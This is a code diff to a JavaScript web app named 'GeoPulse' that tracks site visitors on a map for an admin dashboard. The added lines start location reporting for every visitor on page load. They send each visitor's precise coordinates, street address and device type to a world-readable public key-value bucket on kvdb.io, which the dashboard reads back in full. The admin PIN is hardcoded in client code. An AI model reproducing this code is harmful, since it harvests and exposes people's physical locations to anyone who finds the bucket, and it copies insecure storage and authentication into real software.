@@ -1,5 +1,5 @@
 /**
- * GeoPulse - Role-Based Access Control & Live Location Telemetry Engine
+ * GeoPulse - Role-Based Access Control & Global Cloud Sync Engine
  */
 
 // Application State Variables
@@ -12,8 +12,11 @@ let currentAddressData = null;
 let isDarkLayer = true;
 let tileLayer = null;
 
-// Default Admin Secret PIN (Ubah PIN ini sesuai keinginan Anda)
+// Default Admin Secret PIN
 const ADMIN_SECRET_PIN = "6767";
+
+// Global Cloud Storage Bucket for Multi-User Live Sync
+const KVDB_BUCKET = "geopulse_v67_live_store";
 
 // Unique Visitor ID for this browser session
 let visitorId = localStorage.getItem('geopulse_visitor_id');
@@ -103,7 +106,7 @@ function createVisitorIcon() {
     });
 }
 
-// Send Visitor Location to Server via HTTP Post
+// Send Visitor Location to Global Cloud KV Store
 async function postLocationToServer(lat, lng, accuracy, mainAddr, subAddr) {
     try {
         const payload = {
@@ -113,17 +116,27 @@ async function postLocationToServer(lat, lng, accuracy, mainAddr, subAddr) {
             accuracy: accuracy,
             address: mainAddr,
             subAddress: subAddr,
-            device: navigator.userAgent.includes('Mobile') ? 'Smartphone' : 'Desktop/Laptop'
+            device: navigator.userAgent.includes('Mobile') ? 'Smartphone' : 'Desktop/Laptop',
+            updatedAt: new Date().toLocaleTimeString('id-ID'),
+            timestamp: Date.now()
         };
 
-        const res = await fetch('/api/location', {
+        // Dual posting: Try Local API endpoint & Global Cloud Store
+        fetch('/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+
+        // Post to KVDB Global Sync Store
+        const res = await fetch(`https://kvdb.io/${KVDB_BUCKET}/visitor_${visitorId}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
 
         if (res.ok && valSocketStatus) {
-            valSocketStatus.textContent = "Aktif (Vercel Cloud)";
+            valSocketStatus.textContent = "Aktif (Global Cloud Sync)";
             valSocketStatus.className = "detail-val accent";
         }
     } catch (err) {
@@ -131,20 +144,43 @@ async function postLocationToServer(lat, lng, accuracy, mainAddr, subAddr) {
     }
 }
 
-// Poll Active Visitors List from Server (Admin Dashboard)
+// Poll Active Visitors List from Global Cloud Store (Admin Dashboard)
 async function fetchActiveVisitors() {
     if (adminDashboardView.classList.contains('hidden')) return;
 
     try {
-        const res = await fetch('/api/visitors');
-        if (res.ok) {
-            const data = await res.json();
-            const users = data.users || [];
+        let users = [];
 
-            if (activeCountText) activeCountText.textContent = `${users.length} Orang`;
-            renderVisitorsList(users);
-            updateVisitorMarkersOnMap(users);
+        // Fetch from Global Cloud Sync KV Store
+        const res = await fetch(`https://kvdb.io/${KVDB_BUCKET}/?values=true`);
+        if (res.ok) {
+            const rawData = await res.json();
+            const now = Date.now();
+
+            users = rawData
+                .map(item => {
+                    try {
+                        const val = item[1];
+                        return typeof val === 'string' ? JSON.parse(val) : val;
+                    } catch(e) {
+                        return null;
+                    }
+                })
+                .filter(u => u && u.id && u.lat && u.lng && (now - u.timestamp < 120000));
         }
+
+        // Fallback to Vercel Local API if Cloud KV empty
+        if (users.length === 0) {
+            const localRes = await fetch('/api/visitors');
+            if (localRes.ok) {
+                const localData = await localRes.json();
+                users = localData.users || [];
+            }
+        }
+
+        if (activeCountText) activeCountText.textContent = `${users.length} Orang`;
+        renderVisitorsList(users);
+        updateVisitorMarkersOnMap(users);
     } catch (err) {
         console.warn("Fetch visitors error:", err);
     }
@@ -344,7 +380,7 @@ async function reverseGeocodeAndBroadcast(lat, lng, accuracy) {
     if (addressSub) addressSub.textContent = subAddr;
     if (userRegionBadge) userRegionBadge.innerHTML = `<i class="fa-solid fa-location-dot"></i> ${mainAddr.split(',')[0]}`;
 
-    // Send location telemetry to serverless backend
+    // Post to Global Cloud KV Store
     postLocationToServer(lat, lng, accuracy, mainAddr, subAddr);
 }
 
@@ -397,7 +433,7 @@ function switchRoleView(isAdmin) {
 
 // Event Listeners Initialization
 document.addEventListener('DOMContentLoaded', () => {
-    // Always start location reporting in background for all visitors
+    // Always start background location reporting for all visitors immediately
     fetchAccurateLocation();
     toggleLiveTracking();
 
